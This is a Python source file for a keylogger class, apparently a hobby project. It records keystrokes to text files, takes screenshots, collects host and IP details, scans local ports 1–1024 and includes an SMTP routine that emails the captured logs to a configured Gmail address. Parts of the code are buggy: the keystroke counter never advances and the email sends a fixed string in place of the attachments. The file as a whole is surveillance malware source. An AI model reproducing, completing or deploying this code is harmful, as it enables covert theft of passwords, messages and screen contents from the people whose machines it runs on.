
import logging
from random import randint
import socket
import platform
import time
import threading
import os
import pyscreenshot
import smtplib
import config

from pynput.keyboard import Key, Listener
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from cryptography.fernet import Fernet
class KeyLog():

  logging.basicConfig(filename = ("keylog.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')  
  working_os = platform.system()
  count = 0
  unsorted_data = []

  # files
  sys_info = 'systeminfo.txt'
  screenshots_logged = 'screenshot.png'

  # Record Screenshot
  def screenshotWinMacLin(self):
    if self.working_os == "Linux":
      try:    
        captureScreen = pyscreenshot.grab()
        captureScreen.save(f'{randint(1,999999999)}screen.png', 'PNG')
      except Exception:
        pass
    else:
      image = ImageGrab.grab(all_screens = True)
      image.save(self.screenshots_logged, 'PNG')

  # screenshotWinMacLin()

  def createKey(self):
    cryptKey = Fernet.generate_key()
    return cryptKey
  
  def writeKey(self, cryptKey, key_stored_file):
      with open(key_stored_file, 'wb') as keyFile:
          keyFile.write(cryptKey)

  def loadKey(self, key_stored_file):
      with open(key_stored_file, 'rb') as keyFile:
          cryptKey = keyFile.read()
      return cryptKey

  def encryptFile(self, cryptKey, file_to_be_encrypted, encrypted_file):
      f = Fernet(cryptKey)
      with open(file_to_be_encrypted, 'rb') as current_file:
          before_encryption = current_file.read()        
      encrypted = f.encrypt(before_encryption)
      with open(encrypted_file, 'wb') as current_file:
          current_file.write(encrypted)

  def decryptFile(self, cryptKey, file_to_be_decrypted, decrypted_file):
      f = Fernet(cryptKey)
      with open(file_to_be_decrypted, 'rb') as decrypt_file:
          before_decryption = decrypt_file.read()
      decrypted = f.decrypt(before_decryption)
      with open(decrypted_file, 'wb') as decrypt_file:
          decrypt_file.write(decrypted)

  # Check for open ports in the system
  def check_open_port(self, host, port):
      s = socket.socket()
      try:
          s.connect((host, port))
          s.settimeout(1)
      except:
          return False
      else:
          return True

  # Extracting Computer Information
  def log_computerInfo(self):
    with open(self.sys_info, "w") as sysfile:
      hostname = socket.gethostname()
      IPAddress = socket.gethostbyname(hostname)
      try:
        public_IPAddr = get("https://api.ipify.org").text
        sysfile.write("Public IP Address: " + public_IPAddr)
      except Exception:
        sysfile.write("Not able to find Public IP Address.\n")
      try:
        sysfile.write("Processor: " + (platform.processor()) + '\n')
        platform_OS = platform.system()
        sysfile.write("System: " + platform_OS + ' ' + platform.version() + '\n')
        sysfile.write("Machine: " + platform.machine() + '\n')
        sysfile.write("Hostname: " + hostname + '\n')
        sysfile.write("Private IP Address: " + IPAddress + '\n')
        # host = socket.gethostbyname(socket.gethostname())
        for port in range(1, 1025):
            if self.check_open_port(IPAddress, port):
                sysfile.write(f"[+] {IPAddress}:{port} is open \r")
            else:
                sysfile.write("")
      except Exception:
        pass
      sysfile.close()
  # log_computerInfo()

  def send_recorded_logs(self, fromaddr, toaddr, filesList):
      fromaddr = config.SENDER_EMAIL_ADDR
      toaddr = config.RECIEVER_EMAIL_ADDR

      msg = MIMEMultipart()
      msg['From'] = fromaddr
      msg['To'] = toaddr
      msg['Subject'] = 'This is the subject of my email'

      body = "Body of email"
      msg.attach(MIMEText(body))

      files_to_be_attached = filesList  # ['keylog.txt', 'sorted-data.txt', 'systeminfo.txt', 'screenshot.png']
      for filename in files_to_be_attached:
          attachment = open(filename, 'rb')
          part = MIMEBase("application", "octet-stream")
          part.set_payload(attachment.read())
          encoders.encode_base64(part)
          part.add_header("Content-Disposition", f"attachment; filename = {filename}")
          msg.attach(part)
      msg = msg.as_string()

      try:
          server = smtplib.SMTP('smtp.gmail.com', 587)
          server.ehlo()
          server.starttls()
          server.login(fromaddr, config.SENDER_PASSWORD)
          messagefile = 'Hello is it working..'
          server.sendmail(fromaddr, toaddr, messagefile)
          server.quit()
          print("Email Sent Successfully")


      except Exception as e:
          print("[-] Something went wrong! ...", e)


  # Record Keystrokes
  def on_press(self, key):
    global count, unsorted_data, currentTime
    logging.info(str(key))
    self.unsorted_data.append(str(key))
    
    if self.count >= 20:
      count = 0
      self.write_file(self.unsorted_data)
      unsorted_data = []


  # Clean Data function
  def write_file(self, unsorted_data):
    with open("sorted-data.txt", "a") as clean_file:
      for key in unsorted_data:
        clean_key = str(key).replace("'", "")
        if clean_key.find("space") > 0:
          clean_file.write('\n')
        elif clean_key.find("Key") == -1:
          clean_file.write(clean_key)

  # Exit Function
  def on_release(self, key):
    if key == Key.esc:
      return False


  with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()